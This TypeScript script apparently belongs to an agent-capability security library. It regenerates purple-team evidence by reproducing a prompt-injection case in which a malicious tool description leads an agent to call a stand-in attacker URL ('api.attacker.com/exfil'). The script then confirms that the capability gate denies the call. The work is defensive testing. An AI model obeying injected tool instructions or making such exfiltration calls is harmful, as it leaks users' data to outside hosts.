/**
 * Regenerate the receipt evidence for
 * `docs/purple-team/05-cross-origin-exfil.md`.
 *
 *   npm run -w @capnagent-examples/mcp-http-agent regen-purple-evidence-05
 *
 * Reproduces the attack chain (compromised agent emits an http.get to
 * an attacker-controlled origin), captures the resulting denial
 * receipt, and writes it to
 * `docs/purple-team/evidence/05-cross-origin-exfil.receipt.json`.
 *
 * Inputs are deterministic: the capability is scoped to the literal
 * string `https://api.example.com` and the attacker URL is the literal
 * string `https://api.attacker.com/exfil`. There's no random tempdir
 * in the path, so the receipt's caveat predicate and contextSummary
 * are stable across runs. Only the timestamp (and therefore signature)
 * varies — same shape, same denial reason, same bytes everywhere it
 * matters for the security claim.
 */

import { promises as fs } from "node:fs";
import * as path from "node:path";
import { fileURLToPath } from "node:url";

import { init } from "@capnagent/core";
import { CapabilityDeniedError } from "@capnagent/mcp";

import { createGuardedHttpClient, issueOriginScopedGetCapability } from "../index.js";

const CALLER = "agent:http";
const PUBLIC_GOOD = "https://api.example.com";
const PUBLIC_BAD = "https://api.attacker.com";

async function main(): Promise<void> {
  await init();

  // A fetch that throws if it ever runs — the gate should deny
  // BEFORE fetch is invoked, so a successful regen never hits the
  // network at all.
  const fetchStub: typeof fetch = (async () => {
    throw new Error(
      "SECURITY REGRESSION: fetch invoked during regen — gate should have denied before this point.",
    );
  }) as typeof fetch;

  const cap = issueOriginScopedGetCapability({
    allowedOrigins: [PUBLIC_GOOD],
    caller: CALLER,
  });
  const { client, underlying, receipts } = await createGuardedHttpClient({
    capability: cap,
    caller: CALLER,
    fetch: fetchStub,
  });

  // Reproduce the attack: compromised agent emits the call the
  // malicious tool description told it to make.
  let denied = false;
  try {
    await client.callTool("http.get", { url: `${PUBLIC_BAD}/exfil` });
  } catch (err) {
    if (err instanceof CapabilityDeniedError) {
      denied = true;
    } else {
      throw err;
    }
  }

  if (!denied) {
    console.error("SECURITY FAILURE: capnagent did not deny the cross-origin GET.");
    process.exit(3);
  }
  if (underlying.log.length !== 0) {
    console.error("SECURITY FAILURE: the call reached the underlying http client.");
    process.exit(3);
  }
  if (receipts.length !== 1) {
    console.error(`unexpected receipt count: ${receipts.length}`);
    process.exit(3);
  }

  const receipt = receipts[0];

  // Write the receipt to the evidence dir. The script lives at
  // examples/mcp-http-agent/src/bin/regen-purple-evidence-05.ts so
  // the repo root is four `..` up.
  const here = path.dirname(fileURLToPath(import.meta.url));
  const repoRoot = path.resolve(here, "..", "..", "..", "..");
  const evidencePath = path.join(
    repoRoot,
    "docs",
    "purple-team",
    "evidence",
    "05-cross-origin-exfil.receipt.json",
  );

  await fs.mkdir(path.dirname(evidencePath), { recursive: true });
  await fs.writeFile(evidencePath, `${JSON.stringify(receipt, null, 2)}\n`, "utf8");

  console.log(`Wrote evidence to ${evidencePath}`);
  console.log("");
  console.log("Receipt:");
  console.log(JSON.stringify(receipt, null, 2));
}

main().catch((err) => {
  console.error("error:", err);
  process.exit(1);
});
